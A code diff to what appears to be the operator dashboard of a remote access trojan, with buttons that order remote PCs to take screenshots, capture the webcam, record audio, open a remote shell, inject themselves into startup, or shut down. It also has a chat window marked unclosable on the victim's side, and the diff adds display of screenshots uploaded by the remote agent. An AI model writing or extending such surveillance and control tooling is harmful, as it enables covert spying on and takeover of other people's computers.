@@ -18,6 +18,7 @@ export default function Dashboard() {
   const [computers, setComputers] = useState<Computer[]>([]);
   const [activeModal, setActiveModal] = useState<'chat' | 'screenshot' | null>(null);
   const [selectedPc, setSelectedPc] = useState<string | null>(null);
+  const [selectedPcName, setSelectedPcName] = useState<string | null>(null);
   const [screenshots, setScreenshots] = useState<string[]>([]);
   const [chatMessages, setChatMessages] = useState<{from: string, text: string}[]>([]);
   const [chatInput, setChatInput] = useState("");
@@ -46,14 +47,36 @@ export default function Dashboard() {
     return () => { supabase.removeChannel(sub); };
   }, []);
 
-  const sendCommand = async (pcId: string, cmd: string, args: any = {}) => {
+  const fetchScreenshots = async (pcName: string) => {
+    const { data, error } = await supabase.storage.from('kerchak-assets').list('', {
+      limit: 10,
+      offset: 0,
+      sortBy: { column: 'created_at', order: 'desc' },
+    });
+
+    if (data) {
+      // Filtrer les images qui commencent par le nom du PC
+      const pcFiles = data.filter(f => f.name.startsWith(pcName));
+      const urls = pcFiles.map(f => {
+        const { data: urlData } = supabase.storage.from('kerchak-assets').getPublicUrl(f.name);
+        return urlData.publicUrl;
+      });
+      setScreenshots(urls);
+    }
+  };
+
+  const sendCommand = async (pcId: string, pcName: string, cmd: string, args: any = {}) => {
     await supabase.from('commands').insert({ computer_id: pcId, command: cmd, args, status: 'pending' });
     
     if (cmd === 'ss' || cmd === 'webcam') {
       setSelectedPc(pcId);
+      setSelectedPcName(pcName);
       setActiveModal('screenshot');
+      // Rafraichir les images apres un petit délai pour laisser l'agent uploader
+      setTimeout(() => fetchScreenshots(pcName), 5000);
     } else if (cmd === 'chat_open') {
       setSelectedPc(pcId);
+      setSelectedPcName(pcName);
       setActiveModal('chat');
     }
   };
@@ -110,15 +133,15 @@ export default function Dashboard() {
                 </div>
               </div>
               <div className="grid grid-cols-4 gap-2">
-                <button onClick={() => sendCommand(pc.id, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, 'audio')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Record Audio"><Mic size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'ss')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="Screenshot"><Camera size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'webcam')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-purple-400 transition-colors" title="Webcam"><Monitor size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'audio')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Record Audio"><Mic size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18}/></button>
                 
-                <button onClick={() => sendCommand(pc.id, 'cmd')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Remote Shell"><Terminal size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, 'startup')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-green-400 transition-colors" title="Inject Startup"><Shield size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
-                <button onClick={() => sendCommand(pc.id, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'cmd')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Remote Shell"><Terminal size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'startup')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-green-400 transition-colors" title="Inject Startup"><Shield size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18}/></button>
+                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18}/></button>
               </div>
             </div>
           </div>
@@ -133,7 +156,13 @@ export default function Dashboard() {
               <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
             </div>
             <div className="p-4 flex gap-4 overflow-x-auto min-h-[300px] items-center justify-center">
+              {screenshots.length > 0 ? (
+                screenshots.map((url, i) => (
+                  <img key={i} src={url} className="max-h-[70vh] rounded-lg border border-white/10 shadow-2xl" alt="PC Screenshot" />
+                ))
+              ) : (
                 <span className="text-gray-500 animate-pulse">Waiting for agent to upload image...</span>
+              )}
             </div>
           </div>
         </div>
@@ -145,7 +174,7 @@ export default function Dashboard() {
             <div className="flex justify-between items-center p-4 border-b border-white/10 bg-black/50">
               <h3 className="font-bold flex items-center gap-2 text-pink-400"><MessageSquare size={18}/> Live Chat (Unclosable on Client)</h3>
               <div className="flex gap-2">
-                <button onClick={() => { sendCommand(selectedPc!, 'chat_close'); setActiveModal(null); }} className="text-xs bg-red-500/20 text-red-400 px-3 py-1 rounded hover:bg-red-500/30">Force Close Client</button>
+                <button onClick={() => { sendCommand(selectedPc!, selectedPcName!, 'chat_close'); setActiveModal(null); }} className="text-xs bg-red-500/20 text-red-400 px-3 py-1 rounded hover:bg-red-500/30">Force Close Client</button>
                 <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white"><X size={20}/></button>
               </div>
             </div>
